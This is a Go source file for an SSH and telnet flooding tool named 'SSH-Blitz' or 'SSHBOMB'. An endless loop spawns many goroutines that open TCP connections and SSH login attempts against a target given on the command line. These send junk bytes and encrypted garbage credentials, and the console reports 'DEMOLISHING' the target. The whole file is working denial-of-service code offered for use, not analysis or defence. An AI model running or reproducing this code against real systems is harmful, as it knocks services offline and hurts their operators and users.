package main

import (
	"fmt"
	"time"
	//"log"
	"net"
	"os"

	//"time"

	"crypto/elliptic"

	"github.com/1william1/ecc"
	l "github.com/helloyi/go-sshclient"
)

func main() {



	args := os.Args


	ipandport := args[1]

	count := 0
	for {
		count++
		go print(ipandport, count)
		
		go tel1(ipandport)
		go tel2(ipandport)
		go tel3(ipandport)
		go tel4(ipandport)
		go tel5(ipandport)


		go YumekoECCSSHStandard1(ipandport)
		go YumekoECCSSHStandard2(ipandport)
		go YumekoECCSSHStandard3(ipandport) 
		go YumekoECCSSHStandard4(ipandport)
		go YumekoECCSSHStandard5(ipandport)
		go YumekoECCSSHStandard6(ipandport)
		go YumekoECCSSHStandard7(ipandport)
		go YumekoECCSSHStandard8(ipandport)

		go YumekoECCSSHStandard9(ipandport)
		go YumekoECCSSHStandard10(ipandport)

		go YumekoECCTELStandard1(ipandport)
		go YumekoECCTELStandard2(ipandport)
		go YumekoECCTELStandard3(ipandport)
		go YumekoECCTELStandard4(ipandport)
		go YumekoECCTELStandard5(ipandport)
		go YumekoECCTELStandard6(ipandport)
		go YumekoECCTELStandard7(ipandport)
		go YumekoECCTELStandard8(ipandport)
		go YumekoECCTELStandard9(ipandport)
		go YumekoECCTELStandard10(ipandport)

	}
}

func print(ip string, count int) {
	for {
		fmt.Println("\033[2J\033[1;1H SSH-Blitz | Flooding Current Target |", ip, "| DEMOLISHING | Packets:", count, "| Routines: 5")
		time.Sleep(5 * time.Millisecond)
	}
}

func tel1(ipandport string) {
	conn, _ := net.Dial("tcp", ipandport)
	conn.Write([]byte("\x00\x00\x00\x01"))
	conn.Write([]byte(" " + "\r\n\r\n\r\n\r\n\r\nSSH Blitz Crasher"))
	conn.Write([]byte("\x69\x69"))
}

func tel2(ipandport string) {
	conn, _ := net.Dial("tcp", ipandport)
	conn.Write([]byte("\x00\x00\x00\x01"))
	conn.Write([]byte(" " + "\r\n\r\n\r\n\r\n\r\nSSH Blitz Crasher"))
	conn.Write([]byte("\x69\x69"))
}

func tel3(ipandport string) {
	conn, _ := net.Dial("tcp", ipandport)
	conn.Write([]byte("\x00\x00\x00\x01"))
	conn.Write([]byte(" " + "\r\n\r\n\r\n\r\n\r\nSSH Blitz Crasher"))
	conn.Write([]byte("\x69\x69"))
}

func tel4(ipandport string) {
	conn, _ := net.Dial("tcp", ipandport)
	conn.Write([]byte("\x00\x00\x00\x01"))
	conn.Write([]byte(" " + "\r\n\r\n\r\n\r\n\r\nSSH Blitz Crasher"))
	conn.Write([]byte("\x69\x69"))
}

func tel5(ipandport string) {
	conn, _ := net.Dial("tcp", ipandport)
	conn.Write([]byte("\x00\x00\x00\x01"))
	conn.Write([]byte(" " + "\r\n\r\n\r\n\r\n\r\nSSH Blitz Crasher"))
	conn.Write([]byte("\x69\x69"))
}



func YumekoECCTELStandard10(ipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	fmt.Println("[SSHBOMB] TELNET ECC ->", k1, " -> ", username, " -> SENT")
	conn, _ := net.Dial("tcp", ipandport)
	conn.Write([]byte(username))
}

func YumekoECCTELStandard9(ipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	fmt.Println("[SSHBOMB] TELNET ECC ->", k1, " -> ", username, " -> SENT")
	conn, _ := net.Dial("tcp", ipandport)
	conn.Write([]byte(username))
}

func YumekoECCTELStandard8(ipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	fmt.Println("[SSHBOMB] TELNET ECC ->", k1, " -> ", username, " -> SENT")
	conn, _ := net.Dial("tcp", ipandport)
	conn.Write([]byte(username))
}

func YumekoECCTELStandard7(ipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	fmt.Println("[SSHBOMB] TELNET ECC ->", k1, " -> ", username, " -> SENT")
	conn, _ := net.Dial("tcp", ipandport)
	conn.Write([]byte(username))
}

func YumekoECCTELStandard6(ipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	fmt.Println("[SSHBOMB] TELNET ECC ->", k1, " -> ", username, " -> SENT")
	conn, _ := net.Dial("tcp", ipandport)
	conn.Write([]byte(username))
}

func YumekoECCTELStandard5(ipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	fmt.Println("[SSHBOMB] TELNET ECC ->", k1, " -> ", username, " -> SENT")
	conn, _ := net.Dial("tcp", ipandport)
	conn.Write([]byte(username))
}

func YumekoECCTELStandard4(ipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	fmt.Println("[SSHBOMB] TELNET ECC ->", k1, " -> ", username, " -> SENT")
	conn, _ := net.Dial("tcp", ipandport)
	conn.Write([]byte(username))
}

func YumekoECCTELStandard3(ipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	fmt.Println("[SSHBOMB] TELNET ECC ->", k1, " -> ", username, " -> SENT")
	conn, _ := net.Dial("tcp", ipandport)
	conn.Write([]byte(username))
}

func YumekoECCTELStandard2(ipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	fmt.Println("[SSHBOMB] TELNET ECC ->", k1, " -> ", username, " -> SENT")
	conn, _ := net.Dial("tcp", ipandport)
	conn.Write([]byte(username))
}

func YumekoECCTELStandard1(ipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	fmt.Println("[SSHBOMB] TELNET ECC ->", k1, " -> ", username, " -> SENT")
	conn, _ := net.Dial("tcp", ipandport)
	conn.Write([]byte(username))
}

func YumekoSSHStandard10(ipandport string) {

	client, err := l.DialWithPasswd(ipandport, "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01", "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01")
	fmt.Println("[SSHBOMB] SSH ->", ipandport, " -> SENT")

	if err != nil {
		fmt.Print(err, client)
		return
	}
}

func YumekoSSHStandard9(ipandport string) {

	client, err := l.DialWithPasswd(ipandport, "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01", "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01")
	fmt.Println("[SSHBOMB] SSH ->", ipandport, " -> SENT")

	if err != nil {
		fmt.Print(err, client)
		return
	}
}

func YumekoSSHStandard8(ipandport string) {

	client, err := l.DialWithPasswd(ipandport, "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01", "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01")
	fmt.Println("[SSHBOMB] SSH ->", ipandport, " -> SENT")

	if err != nil {
		fmt.Print(err, client)
		return
	}
}

func YumekoSSHStandard7(ipandport string) {

	client, err := l.DialWithPasswd(ipandport, "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01", "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01")
	fmt.Println("[SSHBOMB] SSH ->", ipandport, " -> SENT")

	if err != nil {
		fmt.Print(err, client)
		return
	}
}

func YumekoSSHStandard6(ipandport string) {

	client, err := l.DialWithPasswd(ipandport, "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01", "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01")
	fmt.Println("[SSHBOMB] SSH ->", ipandport, " -> SENT")

	if err != nil {
		fmt.Print(err, client)
		return
	}
}

func YumekoECCSSHStandard10(sshipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}

	password, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	client, err := l.DialWithPasswd(sshipandport, string(username), string(password))

	if err != nil {
		fmt.Print(err, client)
		return
	}

	fmt.Println("[SSHBOMB] ECC SSH ->", k1, " -> SENT")
}

func YumekoECCSSHStandard9(sshipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}

	password, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	client, err := l.DialWithPasswd(sshipandport, string(username), string(password))

	if err != nil {
		fmt.Print(err, client)
		return
	}

	fmt.Println("[SSHBOMB] ECC SSH ->", k1, " -> SENT")
}

func YumekoECCSSHStandard8(sshipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}

	password, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	client, err := l.DialWithPasswd(sshipandport, string(username), string(password))

	if err != nil {
		fmt.Print(err, client)
		return
	}

	fmt.Println("[SSHBOMB] ECC SSH ->", k1, " -> SENT")
}

func YumekoECCSSHStandard7(sshipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}

	password, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	client, err := l.DialWithPasswd(sshipandport, string(username), string(password))

	if err != nil {
		fmt.Print(err, client)
		return
	}

	fmt.Println("[SSHBOMB] ECC SSH ->", k1, " -> SENT")
}

func YumekoECCSSHStandard6(sshipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}

	password, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	client, err := l.DialWithPasswd(sshipandport, string(username), string(password))

	if err != nil {
		fmt.Print(err, client)
		return
	}

	fmt.Println("[SSHBOMB] ECC SSH ->", k1, " -> SENT")
}

func YumekoECCSSHStandard5(sshipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}

	password, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	client, err := l.DialWithPasswd(sshipandport, string(username), string(password))

	if err != nil {
		fmt.Print(err, client)
		return
	}

	fmt.Println("[SSHBOMB] ECC SSH ->", k1, " -> SENT")
}

func YumekoECCSSHStandard4(sshipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}

	password, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	client, err := l.DialWithPasswd(sshipandport, string(username), string(password))

	if err != nil {
		fmt.Print(err, client)
		return
	}

	fmt.Println("[SSHBOMB] ECC SSH ->", k1, " -> SENT")
}

func YumekoECCSSHStandard3(sshipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}

	password, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	client, err := l.DialWithPasswd(sshipandport, string(username), string(password))

	if err != nil {
		fmt.Print(err, client)
		return
	}

	fmt.Println("[SSHBOMB] ECC SSH ->", k1, " -> SENT")
}

func YumekoECCSSHStandard2(sshipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}

	password, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	client, err := l.DialWithPasswd(sshipandport, string(username), string(password))

	if err != nil {
		fmt.Print(err, client)
		return
	}

	fmt.Println("[SSHBOMB] ECC SSH ->", k1, " -> SENT")
}

func YumekoECCSSHStandard1(sshipandport string) {
	k1, err := ecc.GenerateKey(elliptic.P256())
	if err != nil {
		return
	}

	msg := "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01"
	username, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}

	password, err := k1.Public.Encrypt([]byte(msg))
	if err != nil {
		return
	}
	client, err := l.DialWithPasswd(sshipandport, string(username), string(password))

	if err != nil {
		fmt.Print(err, client)
		return
	}
}